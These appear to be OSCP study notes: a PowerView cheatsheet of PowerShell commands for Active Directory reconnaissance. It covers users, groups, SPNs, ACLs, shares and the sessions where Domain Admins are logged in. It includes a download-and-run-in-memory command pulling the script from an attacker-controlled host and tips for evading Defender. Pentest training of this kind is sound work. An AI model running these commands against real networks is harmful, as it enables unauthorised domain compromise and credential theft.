# PowerView Cheatsheet

> PowerShell tool for Active Directory enumeration. Manual alternative/complement to BloodHound. Good for targeted queries when you know what you're looking for.

---

## Loading PowerView

```powershell
# Bypass execution policy and load
powershell -ep bypass
. .\PowerView.ps1

# Or load directly into memory (evades disk-based AV)
IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/PowerView.ps1')
```

PowerView is part of PowerSploit. Location on Kali:
```
/usr/share/windows-resources/powersploit/Recon/PowerView.ps1
```

---

## Domain Information

```powershell
Get-Domain                          # domain info
Get-DomainController                # find domain controllers
Get-DomainPolicy                    # password policy, etc.
Get-Forest                          # forest info
```

---

## User Enumeration

```powershell
Get-DomainUser                                  # all domain users
Get-DomainUser -Identity jsmith                 # specific user
Get-DomainUser | select samaccountname          # just usernames
Get-DomainUser -SPN                             # users with SPNs (Kerberoast targets!)
Get-DomainUser -PreauthNotRequired              # AS-REP roast targets
Get-DomainUser | select samaccountname,description   # descriptions often hold passwords
```

---

## Group Enumeration

```powershell
Get-DomainGroup                                 # all groups
Get-DomainGroup -Identity "Domain Admins"       # specific group
Get-DomainGroupMember -Identity "Domain Admins" # who's in Domain Admins
Get-DomainGroupMember "Domain Admins" -Recurse  # include nested membership
```

---

## Computer Enumeration

```powershell
Get-DomainComputer                              # all computers
Get-DomainComputer | select name,operatingsystem   # OS versions (find old/vulnerable)
Get-DomainComputer -Ping                        # only live computers
Get-DomainComputer | select dnshostname          # hostnames
```

---

## Finding Where Users Are Logged In (Lateral Movement Gold)

```powershell
# Find machines where you have local admin
Find-LocalAdminAccess

# Find where a specific user is logged in
Find-DomainUserLocation -UserIdentity Administrator

# Find where Domain Admins are logged in (prime targets)
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# Sessions on a specific computer
Get-NetSession -ComputerName <hostname>

# Logged-on users on a computer
Get-NetLoggedon -ComputerName <hostname>
```

**Why this matters:** If a Domain Admin is logged into a machine you can access, you can steal their credentials/token → instant domain compromise.

---

## Service Principal Names (Kerberoasting Setup)

```powershell
# Find all users with SPNs - these are Kerberoastable
Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# Get the SPNs directly
Get-DomainUser -SPN | select serviceprincipalname
```

These feed into Kerberoasting in Module 23 — SPN accounts can have their service tickets requested and cracked offline.

---

## Object Permissions / ACL Abuse

```powershell
# Find ACLs for a specific object
Get-DomainObjectACL -Identity <user/group> -ResolveGUIDs

# Find who can modify a specific object
Get-DomainObjectACL -Identity "Domain Admins" -ResolveGUIDs |
    Where-Object {$_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite|WriteDacl"}

# Find objects a specific user has rights over
Get-DomainObjectACL -ResolveGUIDs |
    Where-Object {$_.SecurityIdentifier -eq "<user_SID>"}
```

**Why this matters:** If you have GenericAll/WriteDACL over a privileged object, you can escalate (reset passwords, add yourself to groups, etc.).

---

## Domain Shares (Credentials Hunting)

```powershell
# Find shares across the domain
Find-DomainShare

# Find shares the current user can access
Find-DomainShare -CheckShareAccess

# Search for sensitive files in shares
Find-InterestingDomainShareFile -Include *.txt,*.xml,*.config,*.ps1
```

Shares frequently hold config files, scripts, and password files.

---

## Trust Enumeration (multi-domain)

```powershell
Get-DomainTrust                     # domain trusts
Get-ForestTrust                     # forest trusts
Get-DomainTrustMapping              # map all trusts
```

---

## Key Attack-Setup Queries (memorize these)

| Goal | Command |
|------|---------|
| Kerberoast targets | `Get-DomainUser -SPN` |
| AS-REP roast targets | `Get-DomainUser -PreauthNotRequired` |
| Where am I local admin | `Find-LocalAdminAccess` |
| Where are DAs logged in | `Find-DomainUserLocation -UserGroupIdentity "Domain Admins"` |
| Domain Admin members | `Get-DomainGroupMember "Domain Admins" -Recurse` |
| Passwords in descriptions | `Get-DomainUser \| select samaccountname,description` |
| ACL abuse paths | `Get-DomainObjectACL -ResolveGUIDs` |

---

## The AD Enumeration Priority

```
1. Get-Domain / Get-DomainController      → understand the layout
2. Get-DomainGroupMember "Domain Admins"  → who are the targets
3. Get-DomainComputer                     → what machines exist
4. Get-DomainUser -SPN                     → Kerberoast targets
5. Get-DomainUser -PreauthNotRequired      → AS-REP targets
6. Find-LocalAdminAccess                   → where can I already get in
7. Find-DomainUserLocation "Domain Admins" → where to steal DA creds
8. Get-DomainUser | select description     → easy credential wins
9. Find-DomainShare -CheckShareAccess      → shares with creds
```

---

## PowerView vs BloodHound

| | PowerView | BloodHound |
|---|-----------|------------|
| Type | Targeted queries | Full graph/visual map |
| Best for | Specific questions, no GUI needed | Finding attack paths automatically |
| Output | Text | Visual graph |
| When to use | Quick checks, stealth, no BH available | Primary enumeration, path-finding |

**Rule of thumb:** BloodHound for the big picture and attack paths; PowerView for targeted follow-up queries and when you can't run SharpHound.

---

## Notes for OSCP

- PowerView is flagged by Defender — load in memory (`IEX`) or rename to bypass.
- Many functions have older aliases (`Get-NetUser` = `Get-DomainUser`) — both often work.
- The `-Domain`, `-Server`, and `-Credential` params let you query a domain you're not joined to (useful when pivoting).
- Focus on the attack-setup queries — SPNs, PreauthNotRequired, LocalAdminAccess, DA locations. Those directly feed your next attacks.

---

## References
- PowerView (PowerSploit): https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
- PowerView cheatsheet: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
